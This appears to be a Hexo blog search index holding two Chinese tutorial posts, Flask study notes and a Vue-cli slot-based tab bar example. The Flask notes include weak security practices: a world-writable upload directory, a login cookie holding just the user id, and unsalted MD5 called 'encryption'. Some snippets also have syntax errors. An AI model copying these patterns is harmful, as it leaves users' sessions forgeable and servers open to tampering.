<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Python-Flask框架学习总结</title>
    <url>/2020/11/10/Python-Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="Python-Flask框架学习总结"><a href="#Python-Flask框架学习总结" class="headerlink" title="Python-Flask框架学习总结"></a>Python-Flask框架学习总结</h1><p>本文讲的是在我使用Flask框架开发中所学到的笔记</p>
<h2 id="flask-sqlacodegen模块"><a href="#flask-sqlacodegen模块" class="headerlink" title="flask-sqlacodegen模块"></a>flask-sqlacodegen模块</h2><ul>
<li>安装：pip install flask-sqlacodegen<h3 id="新建model文件"><a href="#新建model文件" class="headerlink" title="新建model文件"></a>新建model文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flask-sqlacodegen <span class="string">&quot;mysql+pymysql://userName:userPassWord@localhost/dbName&quot;</span> --tables user --outfile <span class="string">&quot;common/models/User.py&quot;</span> --flask</span><br></pre></td></tr></table></figure></li>
<li>“common/models/User.py”表示封装函数位置</li>
<li>“localhost”表示ip<h3 id="封装db-py文件"><a href="#封装db-py文件" class="headerlink" title="封装db.py文件"></a>封装db.py文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="comment"># 配置数据库连接</span></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"><span class="comment"># app.config[&#x27;SQLALCHEMY_DATABASE_URI&#x27;] = </span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="string">&#x27;mysql+pymysql://userName:userPassWord@localhost/dbName&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_COMMIT_ON_TEARDOWN&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">db = SQLAlchemy(app)</span><br></pre></td></tr></table></figure>
<h3 id="将生成的model文件中修改db变量"><a href="#将生成的model文件中修改db变量" class="headerlink" title="将生成的model文件中修改db变量"></a>将生成的model文件中修改db变量</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># from flask_sqlalchemy import SQLAlchemy</span></span><br><span class="line"><span class="comment"># db = SQLAlchemy()</span></span><br><span class="line"><span class="comment"># 将上面的两句改为如下</span></span><br><span class="line"><span class="keyword">from</span> config.DB <span class="keyword">import</span> db</span><br><span class="line"><span class="comment"># config.DB 为封装好的db文件的位置</span></span><br></pre></td></tr></table></figure>
<h3 id="数据库引入及引用"><a href="#数据库引入及引用" class="headerlink" title="数据库引入及引用"></a>数据库引入及引用</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 引入member数据库</span></span><br><span class="line"><span class="keyword">from</span> common.models.member <span class="keyword">import</span> Member</span><br><span class="line"><span class="comment">#调用member数据库，此代码为调用数据库中第一个数据</span></span><br><span class="line">author = Member.query.filter_by().first()</span><br><span class="line"><span class="comment">#其他详细的数据库操作可参考flask-sqlacodegen的数据库操作</span></span><br></pre></td></tr></table></figure>
<h3 id="数据库切片"><a href="#数据库切片" class="headerlink" title="数据库切片"></a>数据库切片</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Commodity_List = CommodityInformation.query.filter_by().order_by().<span class="built_in">all</span>()[ offset:limit ]</span><br><span class="line"><span class="comment">#offset为起试值，limit为终止值,CommodityInformation为model名，Commodity_List 为自命名变量</span></span><br></pre></td></tr></table></figure>
<h2 id="调用当前时间"><a href="#调用当前时间" class="headerlink" title="调用当前时间"></a>调用当前时间</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCurrentDate</span>(<span class="params"><span class="built_in">format</span> =<span class="string">&quot;%Y-%m-%d %H:%M;%S&quot;</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> datetime.datetime.now().strftime(<span class="built_in">format</span>)</span><br><span class="line"><span class="comment">#调用此方法</span></span><br><span class="line">time=getCurrentDate()</span><br></pre></td></tr></table></figure>
<h2 id="过滤昵称表情"><a href="#过滤昵称表情" class="headerlink" title="过滤昵称表情"></a>过滤昵称表情</h2></li>
<li>方法1：使用re库<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re //引入re</span><br><span class="line">result = re_emojis(nickname) //将需要过滤的字符串放入方法，result为已过滤字符串</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_emojis</span>(<span class="params">text</span>):</span> //过滤方法</span><br><span class="line">    emoji_pattern = re.<span class="built_in">compile</span>(<span class="string">&quot;[&quot;</span></span><br><span class="line">           <span class="string">u&quot;\U0001F600-\U0001F64F&quot;</span></span><br><span class="line">           <span class="string">u&quot;\U0001F300-\U0001F5FF&quot;</span></span><br><span class="line">           <span class="string">u&quot;\U0001F680-\U0001F6FF&quot;</span></span><br><span class="line">           <span class="string">u&quot;\U0001F1E0-\U0001F1FF&quot;</span></span><br><span class="line">           <span class="string">&quot;]+&quot;</span>, flags=re.UNICODE)</span><br><span class="line">    <span class="keyword">return</span> emoji_pattern.sub(<span class="string">r&#x27; &#x27;</span>, text)</span><br></pre></td></tr></table></figure></li>
<li>方法2：使用emoji库<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> emoji</span><br><span class="line">text = emoji.demojize(nickname) ) //将需要过滤的字符串放入方法</span><br><span class="line">result = re.sub(<span class="string">&#x27;:\S+?:&#x27;</span>, <span class="string">&#x27; &#x27;</span>, text) //result为已过滤字符串</span><br></pre></td></tr></table></figure></li>
<li>相对来说方法2比方法1所过滤的表情更加全面<h2 id="返回网址"><a href="#返回网址" class="headerlink" title="返回网址"></a>返回网址</h2></li>
<li>引用render_template库<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line">	<span class="keyword">return</span> render_template( <span class="string">&quot;user/login.html&quot;</span> )</span><br></pre></td></tr></table></figure>
<h2 id="上传图片（小程序版）"><a href="#上传图片（小程序版）" class="headerlink" title="上传图片（小程序版）"></a>上传图片（小程序版）</h2></li>
<li>api接口处理<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//接受小程序发来的文件</span><br><span class="line">upfile = file_target[<span class="string">&#x27;image&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;image&#x27;</span> <span class="keyword">in</span> file_target <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> upfile <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        resp[<span class="string">&#x27;state&#x27;</span>] = <span class="string">&quot;上传失败&quot;</span></span><br><span class="line">        <span class="keyword">return</span> jsonify(resp)</span><br><span class="line">//调用上传方法</span><br><span class="line">ret = UploadService.uploadByFile(upfile, <span class="built_in">id</span>)</span><br><span class="line">//返回服务器存放图片的url</span><br><span class="line">resp[<span class="string">&#x27;url&#x27;</span>] = UrlManager.buildImageUrl(ret[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;file_key&#x27;</span>])</span><br></pre></td></tr></table></figure></li>
<li>上传方法实现<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">from</span> config.DB <span class="keyword">import</span> db</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os,stat,uuid</span><br><span class="line"><span class="keyword">from</span> common.libs.helper <span class="keyword">import</span> getCurrentDate</span><br><span class="line"><span class="keyword">from</span> config.base_setting <span class="keyword">import</span> UPLOAD  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UploadService</span>():</span></span><br><span class="line"><span class="meta">	@staticmethod</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">uploadByFile</span>(<span class="params"> file,<span class="built_in">id</span> </span>):</span></span><br><span class="line">		config_upload = UPLOAD</span><br><span class="line">		resp = &#123; <span class="string">&#x27;code&#x27;</span>:<span class="number">200</span>,<span class="string">&#x27;msg&#x27;</span>:<span class="string">&#x27;操作成功~~&#x27;</span>,<span class="string">&#x27;data&#x27;</span>:&#123;&#125; &#125;</span><br><span class="line">		filename = secure_filename( file.filename )</span><br><span class="line">		ext = filename.rsplit(<span class="string">&quot;.&quot;</span>,<span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">		<span class="keyword">if</span> ext <span class="keyword">not</span> <span class="keyword">in</span> config_upload[<span class="string">&#x27;ext&#x27;</span>]:</span><br><span class="line">			resp[<span class="string">&#x27;code&#x27;</span>] = <span class="number">-1</span></span><br><span class="line">			resp[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;不允许的扩展类型文件&quot;</span></span><br><span class="line">			<span class="keyword">return</span> resp</span><br><span class="line">		root_path = config_upload[<span class="string">&#x27;prefix_path&#x27;</span>]</span><br><span class="line">		<span class="comment">#不使用getCurrentDate创建目录，为了保证其他写的可以用，这里改掉，服务器上好像对时间不兼容</span></span><br><span class="line">		file_dir = datetime.datetime.now().strftime(<span class="string">&quot;%Y%m%d&quot;</span>)</span><br><span class="line">		save_dir = root_path + <span class="built_in">id</span> + <span class="string">&quot;/&quot;</span> + file_dir</span><br><span class="line">		print(save_dir)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> os.path.exists( save_dir ):</span><br><span class="line">			os.makedirs( save_dir )</span><br><span class="line">			os.chmod( save_dir,stat.S_IRWXU | stat.S_IRGRP |  stat.S_IRWXO )</span><br><span class="line">		file_name = <span class="built_in">str</span>( uuid.uuid4() ).replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;&quot;</span>) + <span class="string">&quot;.&quot;</span> + ext</span><br><span class="line">		file.save( <span class="string">&quot;&#123;0&#125;/&#123;1&#125;&quot;</span>.<span class="built_in">format</span>( save_dir,file_name ) )</span><br><span class="line">		resp[<span class="string">&#x27;data&#x27;</span>] = &#123;</span><br><span class="line">			<span class="string">&#x27;file_key&#x27;</span>:  <span class="built_in">id</span> + <span class="string">&quot;/&quot;</span> + file_dir + <span class="string">&quot;/&quot;</span> + file_name</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure></li>
<li>base_seting文件<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">UPLOAD = &#123;</span><br><span class="line">    <span class="string">&#x27;ext&#x27;</span>:[ <span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;bmp&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;png&#x27;</span> ], //允许上传的文件格式</span><br><span class="line">    <span class="string">&#x27;prefix_path&#x27;</span>:<span class="string">&#x27;static/upload/&#x27;</span>, //上传位置</span><br><span class="line">    <span class="string">&#x27;prefix_url&#x27;</span>:<span class="string">&#x27;static/upload/&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">APP = &#123;</span><br><span class="line">    <span class="string">&#x27;domain&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span> //服务器ip地址</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="密码加密"><a href="#密码加密" class="headerlink" title="密码加密"></a>密码加密</h2></li>
<li>引入make_response库<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> make_response</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">response = make_response( json.dumps( resp ) )</span><br><span class="line">//第一个空格为名字</span><br><span class="line">//第一个%s</span><br><span class="line">//第二个%s是user_info.uid，即为用户<span class="built_in">id</span></span><br><span class="line">response.set_cookie( <span class="string">&quot;mooc_food&quot;</span>,<span class="string">&quot;%s#%s&quot;</span>%(<span class="string">&quot;&quot;</span>,user_info.uid) )</span><br></pre></td></tr></table></figure></li>
<li>创建cookie值加密(引用此方法即可return回加密值)<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneAuthCode</span>(<span class="params"> user_info </span>):</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&quot;%s-%s-%s&quot;</span>%( user_info.x,user_info.y,user_info.z )</span><br><span class="line">    m.update(<span class="built_in">str</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue-cli的slot示例</title>
    <url>/2020/11/10/Vue-cli%E7%9A%84slot%E7%A4%BA%E4%BE%8B/</url>
    <content><![CDATA[<h1 id="vue-cli-tabbar封装学习"><a href="#vue-cli-tabbar封装学习" class="headerlink" title="vue-cli-tabbar封装学习"></a>vue-cli-tabbar封装学习</h1><h2 id="slot实现tabbar封装"><a href="#slot实现tabbar封装" class="headerlink" title="slot实现tabbar封装"></a>slot实现tabbar封装</h2><h3 id="创建tabbar组件（TabBar-vue）"><a href="#创建tabbar组件（TabBar-vue）" class="headerlink" title="创建tabbar组件（TabBar.vue）"></a>创建tabbar组件（TabBar.vue）</h3><ul>
<li>创建tab-bar块，并放入<code>slot</code>插槽,<code>slot</code>可以在在调用此组件时插入其他组件  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;tab-bar&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>导出组件  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name: <span class="string">&quot;TabBar&quot;</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>渲染css  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-id">#tab-bar</span>&#123;</span></span><br><span class="line">        display: flex;</span><br><span class="line">        background-color: burlywood;</span><br><span class="line">        position: fixed;</span><br><span class="line">        left: 0;</span><br><span class="line">        right: 0;</span><br><span class="line">        bottom: 0;</span><br><span class="line"><span class="css">        <span class="selector-tag">box-shadow</span>: 0<span class="selector-tag">px</span> <span class="selector-tag">-3px</span> 1<span class="selector-tag">px</span> <span class="selector-tag">rgba</span>(100,100,100,<span class="selector-class">.08</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="创建tabbarItem组件（TabBarItem-vue）"><a href="#创建tabbarItem组件（TabBarItem-vue）" class="headerlink" title="创建tabbarItem组件（TabBarItem.vue）"></a>创建tabbarItem组件（TabBarItem.vue）</h3></li>
<li>创建tab-bar-item块，并放入<code>slot</code>插槽</li>
<li><code>@click=&quot;itemClick&quot;</code>绑定<code>itemClick</code>点击事件</li>
<li><code>:style=&quot;activeStyle&quot;</code>绑定<code>activeStyle</code>样式来渲染  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tab-bar-item&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;itemClick&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;isActive&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;item-icon&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;item-icon-active&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">:style</span>=<span class="string">&quot;activeStyle&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;item-text&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>导出组件并定义js操作</li>
<li><code>props</code>接收tabbar传来的属性</li>
<li>使用<code>computed</code>计算属性来判定操作<ul>
<li><code>this.$route.path.indexOf(this.path) !== -1</code>判定当前路径是否是活跃路径</li>
<li><code>return this.isActive ? &#123;color: this.activeColor&#125; : &#123;&#125;</code>根据<code>isActive</code>值来返回样式</li>
</ul>
</li>
<li><code>itemClick</code>事件触发来跳转界面  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name: <span class="string">&quot;TarBarItem&quot;</span>,</span></span><br><span class="line">        props: &#123;</span><br><span class="line"><span class="javascript">            path: <span class="built_in">String</span>,</span></span><br><span class="line">            activeColor:&#123;</span><br><span class="line"><span class="javascript">                type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="javascript">                <span class="keyword">default</span>: <span class="string">&#x27;red&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        computed: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">isActive</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> <span class="built_in">this</span>.$route.path.indexOf(<span class="built_in">this</span>.path) !== -<span class="number">1</span></span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">activeStyle</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> <span class="built_in">this</span>.isActive ? &#123;<span class="attr">color</span>: <span class="built_in">this</span>.activeColor&#125; : &#123;&#125;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">itemClick</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.$router.replace(<span class="built_in">this</span>.path)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>渲染css  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.tab-bar-item</span>&#123;</span></span><br><span class="line">        flex: 1;</span><br><span class="line">        text-align: center;</span><br><span class="line">        height: 49px;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.tab-bar-item</span> <span class="selector-tag">img</span> &#123;</span></span><br><span class="line">        height: 25px;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="创建路由-同时创建4个相应界面-此步骤省略"><a href="#创建路由-同时创建4个相应界面-此步骤省略" class="headerlink" title="创建路由(同时创建4个相应界面-此步骤省略)"></a>创建路由(<code>同时创建4个相应界面-此步骤省略</code>)</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line">Vue.use(VueRouter)</span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">    &#123;</span><br><span class="line">    path: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    redirect: <span class="string">&#x27;/home1&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    path: <span class="string">&#x27;/home1&#x27;</span>,</span><br><span class="line">    component: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/pages/Home&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    path: <span class="string">&#x27;/home2&#x27;</span>,</span><br><span class="line">    component: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/pages/Home2&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    path: <span class="string">&#x27;/home3&#x27;</span>,</span><br><span class="line">    component: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/pages/Home3&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    path: <span class="string">&#x27;/home4&#x27;</span>,</span><br><span class="line">    component: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/pages/Home4&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">mode: <span class="string">&#x27;history&#x27;</span>,</span><br><span class="line">base: process.env.BASE_URL,</span><br><span class="line">routes</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure>
<h3 id="App-vue实现tabbar"><a href="#App-vue实现tabbar" class="headerlink" title="App.vue实现tabbar"></a>App.vue实现tabbar</h3></li>
</ul>
<ol>
<li>使用组件，标签使用组件名，组件名以驼峰命名法，例：<code>组件名-TabBar，标签名可用-&lt;tabBar&gt;/&lt;tab-bar&gt;</code></li>
<li>插槽可根据之前定义的slot-name来绑定，例：<code>&lt;slot name=&#39;a&#39;&gt;&lt;/slot&gt;--对应--&lt;div slot=&#39;a&#39;&gt;&lt;/div&gt;</code></li>
<li><code>&lt;tab-bar-item path=&quot;/home1&quot; active-color=&quot;blue&quot;&gt;</code>传递<code>path</code>、<code>activeColor</code>属性到<code>tabBarItem</code>组件 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tabBar</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tab-bar-item</span> <span class="attr">path</span>=<span class="string">&quot;/home1&quot;</span> <span class="attr">active-color</span>=<span class="string">&quot;blue&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">slot</span>=<span class="string">&quot;item-icon&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/img/1.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">slot</span>=<span class="string">&quot;item-icon-active&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/img/3.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">slot</span>=<span class="string">&quot;item-text&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tab-bar-item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tab-bar-item</span> <span class="attr">path</span>=<span class="string">&quot;/home2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">slot</span>=<span class="string">&quot;item-icon&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/img/1.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">slot</span>=<span class="string">&quot;item-icon-active&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/img/3.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">slot</span>=<span class="string">&quot;item-text&quot;</span>&gt;</span>首页2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tab-bar-item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tab-bar-item</span> <span class="attr">path</span>=<span class="string">&quot;/home3&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">slot</span>=<span class="string">&quot;item-icon&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/img/1.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">slot</span>=<span class="string">&quot;item-icon-active&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/img/3.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">slot</span>=<span class="string">&quot;item-text&quot;</span>&gt;</span>首页3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tab-bar-item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tab-bar-item</span> <span class="attr">path</span>=<span class="string">&quot;/home4&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">slot</span>=<span class="string">&quot;item-icon&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/img/1.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">slot</span>=<span class="string">&quot;item-icon-active&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/img/3.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">slot</span>=<span class="string">&quot;item-text&quot;</span>&gt;</span>首页4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tab-bar-item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tabBar</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>导入组件  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">import</span> TabBar <span class="keyword">from</span> <span class="string">&quot;./views/TabBar&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> TabBarItem <span class="keyword">from</span> <span class="string">&quot;./views/TarBarItem&quot;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    name: <span class="string">&#x27;App&#x27;</span>,</span><br><span class="line">    components: &#123;</span><br><span class="line">    TabBar,</span><br><span class="line">    TabBarItem</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Vue-cli</tag>
        <tag>Vue-router</tag>
        <tag>v-lot</tag>
      </tags>
  </entry>
